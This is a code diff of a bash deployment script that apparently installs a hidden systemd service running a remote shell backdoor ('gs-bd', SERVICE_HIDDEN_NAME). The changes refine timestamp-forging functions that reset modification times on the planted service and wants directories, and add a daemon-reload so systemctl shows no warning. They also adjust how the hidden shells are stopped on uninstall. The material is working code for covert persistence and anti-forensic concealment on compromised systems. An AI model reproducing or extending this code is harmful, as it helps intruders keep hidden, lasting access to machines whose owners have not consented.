@@ -84,7 +84,7 @@ _ts_fix()
 	[[ ! -e "$1" ]] && return
 	[[ -z $ts ]] && return
 
-	# Change the symlink for ts_last_fn items
+	# Change the symlink for ts_systemd_fn items
 	[[ -n "$3" ]] && args=("-h")
 
 	# Either reference by Timestamp or File
@@ -105,7 +105,6 @@ ts_restore()
 	local n
 	local ts
 
-	[[ ${#_ts_fn_a[@]} -eq 0 ]] && return
 	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }
 
 	n=0
@@ -118,17 +117,21 @@ ts_restore()
 
 		_ts_fix "$fn" "$ts"
 	done
+	unset _ts_fn_a
+	unset _ts_ts_a
 
 	n=0
 	while :; do
-		[[ $n -eq "${#_ts_last_ts_a[@]}" ]] && break
-		ts="${_ts_last_ts_a[$n]}"
-		fn="${_ts_last_fn_a[$n]}"
-		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
+		ts="${_ts_systemd_ts_a[$n]}"
+		fn="${_ts_systemd_fn_a[$n]}"
+		DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
 		((n++))
 
 		_ts_fix "$fn" "$ts" "symlink"
 	done
+	unset _ts_systemd_fn_a
+	unset _ts_systemd_ts_a
 }
 
 ts_is_marked()
@@ -149,7 +152,7 @@ ts_is_marked()
 # There are some files which need TimeStamp update after all other TimeStamps
 # have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
 # ts_add_last [file] <reference file>
-ts_add_last()
+ts_add_systemd()
 {
 	local fn
 	local ts
@@ -162,9 +165,9 @@ ts_add_last()
 		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
 	}
 
-	# Note: _ts_last_ts_a may store a number or a directory (start with '/')
-	_ts_last_ts_a+=("$ts")
-	_ts_last_fn_a+=("$fn")
+	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
+	_ts_systemd_ts_a+=("$ts")
+	_ts_systemd_fn_a+=("$fn")
 }
 
 # Determine the Timestamp of the file $fn that is about to be
@@ -351,7 +354,7 @@ xmv()
 	true
 }
 
-exit_clean()
+clean_all()
 {
 	[[ "${#TMPDIR}" -gt 5 ]] && {
 		rm -rf "${TMPDIR:?}/"*
@@ -363,7 +366,7 @@ exit_clean()
 
 exit_code()
 {
-	exit_clean
+	clean_all
 
 	exit "$1"
 }
@@ -728,10 +731,10 @@ uninstall_service()
 	[[ ! -f "${sf}" ]] && return
 
 	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
-		ts_add_last "${WANTS_DIR}/multi-user.target.wants"
+		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 		# STOPPING would kill the current login shell. Do not stop it.
 		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-		systemctl disable "${sn}" 2>/dev/null
+		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+=";systemctl stop ${sn}"
 	}
 
 	uninstall_rm "${sf}"
@@ -792,7 +795,7 @@ uninstall()
 	uninstall_rm "/etc/system/system/gs-bd.dat" #OLD
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
+	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
 	exit_code 0
 }
 
@@ -905,8 +908,8 @@ ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec 
 WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
 
 	gs_secret_write "$SYSTEMD_SEC_FILE"
-	ts_add_last "${WANTS_DIR}/multi-user.target.wants"
-	ts_add_last "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
 	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
 
@@ -1317,6 +1320,10 @@ gs_start_systemd()
 {
 	# HERE: It's systemd
 	if [[ -z "$IS_GS_RUNNING" ]]; then
+		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
+		# is needed. Thus fix Timestamp here and reload.
+		clean_all
+		systemctl daemon-reload
 		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
 		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
 			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
